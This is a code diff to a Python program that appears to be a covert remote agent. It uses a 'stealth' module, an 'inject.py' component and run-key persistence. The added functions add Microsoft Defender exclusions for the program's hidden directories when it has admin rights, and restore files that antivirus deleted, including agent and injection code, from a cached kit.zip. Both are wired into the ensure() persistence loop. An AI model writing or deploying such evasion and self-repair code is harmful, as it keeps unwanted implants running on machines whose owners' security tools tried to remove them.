@@ -459,6 +459,81 @@ def _harden_acl() -> list[str]:
     return done
 
 
+_defender_done: bool = False
+
+
+def _exclude_from_defender() -> list[str]:
+    """Stop Defender quarantining our own bytecode.  Admin only, idempotent."""
+    global _defender_done
+    if not IS_WINDOWS or not stealth.is_admin():
+        return []
+    try:
+        from . import defender
+    except Exception:
+        return []
+    actions: list[str] = []
+    for directory in (stealth.primary_directory(), stealth.anchor_directory()):
+        if os.path.isdir(directory) and defender.add_exclusion(directory):
+            actions.append("defender excluded " + directory)
+    if actions:
+        _defender_done = True
+    return actions
+
+
+def repair_from_kit() -> list[str]:
+    """Restore source files an AV deleted, from the cached kit.zip.
+
+    install_copies() cannot help here: the running bundle IS the install
+    directory, so a deleted file has no source to copy from.
+    """
+    if not IS_WINDOWS:
+        return []
+    import zipfile
+
+    kit = ""
+    for candidate in (stealth.kit_cache_path(), stealth.anchor_kit_path()):
+        if os.path.isfile(candidate):
+            kit = candidate
+            break
+    if not kit:
+        return []
+
+    wanted = (
+        "agent.py",
+        os.path.join("syspy", "__init__.py"),
+        os.path.join("syspy", "agent", "core.py"),
+        os.path.join("syspy", "agent", "commands.py"),
+        os.path.join("syspy", "agent", "inject.py"),
+    )
+    restored: list[str] = []
+    try:
+        with zipfile.ZipFile(kit) as archive:
+            members = {n.replace("\\", "/"): n for n in archive.namelist()}
+            for target in dict.fromkeys(stealth.install_directories()):
+                for relative in wanted:
+                    flat = relative.replace("\\", "/")
+                    destination = os.path.join(target, relative)
+                    if os.path.exists(destination):
+                        continue
+                    match = None
+                    for key, original in members.items():
+                        if key == flat or key.endswith("/" + flat):
+                            match = original
+                            break
+                    if match is None:
+                        continue
+                    try:
+                        os.makedirs(os.path.dirname(destination), exist_ok=True)
+                        with archive.open(match) as src, open(destination, "wb") as dst:
+                            shutil.copyfileobj(src, dst)
+                        restored.append(destination)
+                    except OSError:
+                        pass
+    except (OSError, zipfile.BadZipFile):
+        pass
+    return restored
+
+
 # --------------------------------------------------------------------------
 # POSIX persistence
 # --------------------------------------------------------------------------
@@ -549,6 +624,11 @@ def ensure() -> list[str]:
             _cache_kit()
             actions.append("recached kit")
         actions += _reassert_run_keys()
+        if not _defender_done:
+            actions += _exclude_from_defender()
+        repaired = repair_from_kit()
+        if repaired:
+            actions.append("repaired " + str(len(repaired)) + " file(s) from kit")
     return actions
 
 
